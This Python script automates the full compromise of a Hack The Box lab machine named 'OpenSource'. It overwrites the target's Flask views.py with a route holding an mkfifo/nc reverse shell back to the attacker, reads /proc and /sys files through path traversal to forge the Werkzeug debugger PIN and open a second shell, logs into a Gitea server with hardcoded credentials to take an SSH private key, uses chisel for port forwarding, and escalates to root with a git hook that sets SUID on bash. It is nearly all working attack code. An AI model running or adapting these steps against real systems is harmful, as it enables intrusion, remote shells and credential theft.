import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-OpenSource
    __________________________________________________________________________\n"""
    print(Fore.LIGHTBLUE_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] docker_user","[+] docker_user_root","[+] dev01_user","[+] root-user","[-] exit"]
    opcion = select(
        "Selecciona una opción:",   
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.164" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"{target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Mailing Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------


def shell_file_request():
    file_url="http://10.10.11.164/upcloud"
    s = requests.Session()
    # getAtt=s.get(file_url)
    # print(getAtt.headers)
    # print(getAtt.text)

    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br'
    }

    payload=f"""import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {machine_ip} 443 >/tmp/f")
"""

    submit_file={   
            'file': ('/app/app/views.py', payload, 'text/x-python')
    }

    response=s.post(file_url, files=submit_file, headers=header)
    # print(response.status_code)

    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user Command (Listen-Port-443)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [docker_user] > " + Fore.WHITE + f"Press ENTER to continue...")
    send_shell=s.get("http://10.10.11.164/shell")
    # print(send_shell.status_code)

console_url="http://10.10.11.164/console"
console_pin_url_checker="http://10.10.11.164//console?__debugger__=yes&cmd=pinauth&pin="
def docker_user2_connection():

    s = requests.Session()

    pin_file="CmltcG9ydCBoYXNobGliCmZyb20gaXRlcnRvb2xzIGltcG9ydCBjaGFpbgpwcm9iYWJseV9wdWJsaWNfYml0cyA9IFsKICAgICdyb290JywgICMgdXNlcm5hbWUKICAgICdmbGFzay5hcHAnLCAgIyBtb2RuYW1lCiAgICAnRmxhc2snLCAgIyBnZXRhdHRyKGFwcCwgJ19fbmFtZV9fJywgZ2V0YXR0cihhcHAuX19jbGFzc19fLCAnX19uYW1lX18nKSkKICAgICcvdXNyL2xvY2FsL2xpYi9weXRob24zLjEwL3NpdGUtcGFja2FnZXMvZmxhc2svYXBwLnB5JyAgIyBnZXRhdHRyKG1vZCwgJ19fZmlsZV9fJywgTm9uZSksCl0KCnByaXZhdGVfYml0cyA9IFsKICAgICcyNDg1Mzc3ODkyMzU0JywgICMgc3RyKHV1aWQuZ2V0bm9kZSgpKSwgIC9zeXMvY2xhc3MvbmV0L2VuczMzL2FkZHJlc3MKICAgICdhYzVlYzIxMy05MGY1LTQ0NWMtYTcwOC1lNDk1YmY4YTM2OGRkMTllYjE1ZDAzNDM4Yjc2NWJlZmJlNWMyMzM0MDVlOGY2NDQ1NmQxZjY5YjJkZmM0M2E0MDkwMDRmZmYzMjUwJyAgIyBnZXRfbWFjaGluZV9pZCgpLCAvZXRjL21hY2hpbmUtaWQKXQoKI2ggPSBoYXNobGliLm1kNSgpICAjIENoYW5nZWQgaW4gaHR0cHM6Ly93ZXJremV1Zy5wYWxsZXRzcHJvamVjdHMuY29tL2VuLzIuMi54L2NoYW5nZXMvI3ZlcnNpb24tMi0wLTAKaCA9IGhhc2hsaWIuc2hhMSgpCgpmb3IgYml0IGluIGNoYWluKHByb2JhYmx5X3B1YmxpY19iaXRzLCBwcml2YXRlX2JpdHMpOgogICAgaWYgbm90IGJpdDoKICAgICAgICBjb250aW51ZQogICAgaWYgaXNpbnN0YW5jZShiaXQsIHN0cik6CiAgICAgICAgYml0ID0gYml0LmVuY29kZSgndXRmLTgnKQogICAgaC51cGRhdGUoYml0KQpoLnVwZGF0ZShiJ2Nvb2tpZXNhbHQnKQojaC51cGRhdGUoYidzaGl0dHlzYWx0JykKCmNvb2tpZV9uYW1lID0gJ19fd3pkJyArIGguaGV4ZGlnZXN0KClbOjIwXQoKbnVtID0gTm9uZQppZiBudW0gaXMgTm9uZToKICAgIGgudXBkYXRlKGIncGluc2FsdCcpCiAgICBudW0gPSAoJyUwOWQnICUgaW50KGguaGV4ZGlnZXN0KCksIDE2KSlbOjldCgpydiA9IE5vbmUKaWYgcnYgaXMgTm9uZToKICAgIGZvciBncm91cF9zaXplIGluIDUsIDQsIDM6CiAgICAgICAgaWYgbGVuKG51bSkgJSBncm91cF9zaXplID09IDA6CiAgICAgICAgICAgIHJ2ID0gJy0nLmpvaW4obnVtW3g6eCArIGdyb3VwX3NpemVdLnJqdXN0KGdyb3VwX3NpemUsICcwJykKICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiByYW5nZSgwLCBsZW4obnVtKSwgZ3JvdXBfc2l6ZSkpCiAgICAgICAgICAgIGJyZWFrCiAgICBlbHNlOgogICAgICAgIHJ2ID0gbnVtCgpwcmludChydikK"
    try:
        commands_send(f"echo '{pin_file}' | base64 -d > pin.py")
        add_eth=commands_send("curl http://10.10.11.164/uploads/..///sys/class/net/eth0/address --path-as-is | grep ':'")
        print("Eth0 Address > ",add_eth)
        print("Eth0 Address Decimal > ",int("02:42:ac:11:00:02".replace(":", ""), 16))
        eth0_decimal=int("02:42:ac:11:00:02".replace(":", ""), 16)
        boot_id=commands_send("curl http://10.10.11.164/uploads/..///proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length")
        print("Boot-ID > ",boot_id)
        cgroup_proc=commands_send("curl http://10.10.11.164/uploads/..///proc/self/cgroup --path-as-is --ignore-content-length | awk -F'/' '{print $3}' | sort | uniq | grep -vE \"snap|^$\"")
        print("Cgroup-proc > ", cgroup_proc)
        id_join=str(boot_id+cgroup_proc)
        #commands_send(f"sed -i 's/web3_user/'root'/g' pin.py")
        #commands_send(f"send -i 's//usr/local/lib/python3.5/dist-packages/flask/app.py//usr/local/lib/python3.10/site-packages/flask/app.py/g' pin.py")
        commands_send(f"sed -i 's/279275995014060/{eth0_decimal}/g' pin.py")
        commands_send(f"sed -i 's/ac5ec213-90f5-445c-a708-e495bf8a368dd19eb15d03438b765befbe5c233405e8f64456d1f69b2dfc43a409004fff3250/{id_join}/g' pin.py")
        pin_code=commands_send(f"python3 pin.py")

        console_log=s.get(console_url)
        #print(console_log.text)   http://10.10.11.164//console?__debugger__=yes&cmd=pinauth&pin=135-864-940&s=mX1zq2qcCeN5e5oOkGCS
        secret_log = re.search(r'SECRET\s*=\s*"([^"]+)"', console_log.text)
        secret=secret_log.group(1)
        target_pin_url=f"{console_url}?__debugger__=yes&cmd=pinauth&pin={pin_code}&s={secret}"
                
        send_response_pin=s.get(target_pin_url)
        coookie=send_response_pin.headers.get("Set-Cookie").split(';')[0].strip()
        print(send_response_pin.status_code)

        header={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Cookie': f'{coookie}'
        }

        os_send_url=f"{console_url}?&__debugger__=yes&cmd=import%20os%20&frm=0&s={secret}"
        shell_send_url=f"{console_url}?&__debugger__=yes&cmd=os.popen(%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{machine_ip}%20443%20%3E%2Ftmp%2Ff%22).read()&frm=0&s={secret}"

        print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user-root Command (Listen-Port-443)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
        input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [docker_user-root] > " + Fore.WHITE + f"Press ENTER to continue...")

        s.get(os_send_url, headers=header)
        s.get(shell_send_url, headers=header)

    except:
        print("Ocurrio un error")


def get_id_rsa_logingit():
    git_url=f"http://{machine_ip}:3000/user/login"
    id_rsa_url=f"http://{machine_ip}:3000/dev01/home-backup/src/branch/main/.ssh/id_rsa"
    s = requests.Session()
    
    content=s.get(git_url)
    cookv1=content.headers.get("Set-Cookie").split(";")[0].strip()
    cookv2=content.headers.get("Set-Cookie").split(";")[3].split(",")[1].strip()
    cookie=f"{cookv1}; {cookv2}; redirect_to=%2F"
    # print(cookie)
    # print(content.text)
    csrf_token = re.search(r"csrfToken:\s*'([^']+)'", content.text).group(1)
    # print(csrf_token)


    header={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'{cookie}'
    }

    payload=f"_csrf={csrf_token}&user_name=dev01&password=Soulless_Developer%232022"

    login=s.post(git_url, payload, headers=header)
    #print(login.status_code)
    #print(s.get(id_rsa_url).headers)
    content_id_rsa=s.get(id_rsa_url).text
    matches = re.findall(r'<span class="cl">(.*?)</code>', content_id_rsa)
    
    id_rsa_content=""

    for line in matches:
        id_rsa_content+=line+"\n"
    id_rsa_content+="-----END RSA PRIVATE KEY-----"
    commands_send(f"echo '{id_rsa_content}' > id_rsa")
    commands_send("chmod 600 id_rsa")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[dev01-user-root Command] > " + Fore.LIGHTMAGENTA_EX + f"ssh -i id_rsa dev01@{target_machine}")


def devandroot_user_connection():
    commands_send("wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz")
    commands_send("gunzip chisel_1.10.1_linux_amd64.gz")
    commands_send("chmod +x chisel_1.10.1_linux_amd64")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user-root Command (Listen Port)] > " + Fore.LIGHTMAGENTA_EX + f"python3 -m http.server 8000")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [docker_user-root] > " + Fore.WHITE + f"Press ENTER to continue...")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user-root Command (Download Victim)] > " + Fore.LIGHTMAGENTA_EX + f"wget http://{machine_ip}:8000/chisel_1.10.1_linux_amd64")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user-root Command (Chisel PFW Attack)] > " + Fore.LIGHTMAGENTA_EX + f"./chisel_1.10.1_linux_amd64 server --reverse -p 1234")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-user-root Command (Chisel PFW Victim)] > " + Fore.LIGHTMAGENTA_EX + f"./chisel_1.10.1_linux_amd64 client {machine_ip}:1234 R:3000:172.17.0.1:3000")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [docker_user-root] > " + Fore.WHITE + f"Press ENTER to continue...")

def root_user_connection():
    print(tmsg,Fore.LIGHTBLUE_EX + "[docker-user-root Command (Victim)] > " + Fore.LIGHTMAGENTA_EX + f"echo 'chmod u+s /bin/bash' > /home/dev01/.git/hooks/pre-commit")
    print(tmsg,Fore.LIGHTBLUE_EX + "[docker-user-root Command (Victim)] > " + Fore.LIGHTMAGENTA_EX + f"chmod +x /home/dev01/.git/hooks/pre-commit")
    print(tmsg,Fore.LIGHTBLUE_EX + "[docker-user-root Command (Victim)] > " + Fore.LIGHTMAGENTA_EX + f"bash -p")

#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Docker-user connection"))
                print(tmsg,Fore.RED + f"[Exploit - Docker-user] > " + Fore.YELLOW + f"Path Exploit" + Fore.LIGHTCYAN_EX + f"http://{target_machine}/");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - Docker-user] > " + Fore.YELLOW + f"Cracked Password" + Fore.LIGHTCYAN_EX + f"");cm.sleep(.5)                
                shell_file_request()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Docker-user-root user connection"))
                docker_user2_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user-root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][2]:
                print(tmsg,hmsg("user","Dev01-user-root user connection"))
                devandroot_user_connection()
                get_id_rsa_logingit()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user-root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][3]:
                print(tmsg,hmsg("user","root-user user connection"))
                root_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user-root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
